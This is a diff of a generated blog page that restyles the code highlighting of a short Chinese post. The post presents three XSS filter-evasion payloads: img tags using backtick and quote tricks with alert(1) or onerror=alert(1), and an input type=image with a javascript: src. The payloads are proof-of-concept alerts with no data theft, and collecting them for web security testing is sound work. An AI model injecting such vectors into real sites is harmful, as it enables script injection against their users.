@@ -294,7 +294,8 @@
     <!-- Custom Head -->
     
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
     
@@ -478,8 +479,12 @@
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
         <p>这两种payload看起来js都在引号里，但确实能跑，给跪了</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x` ` &lt;script&gt;alert(1)&lt;/script&gt;"</span>` `&gt;</span> <span class="comment">&lt;!-- IE --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>= <span class="string">alt</span>=<span class="string">" onerror=alert(1) //"</span>&gt;</span> <span class="comment">&lt;!-- IE FF Chrome--&gt;</span></div></pre></td></tr></table></figure>
-<p>补一个不常用的<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">"javascript: alert('xss');"</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;img src="x` ` <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>alert(1)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>"` `> <span class="token comment" spellcheck="true">&lt;!-- IE --></span>
+&lt;img src= alt=" onerror=alert(1) //"> <span class="token comment" spellcheck="true">&lt;!-- IE FF Chrome--></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>补一个不常用的</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript: alert(<span class="token punctuation">'</span>xss<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
         
     
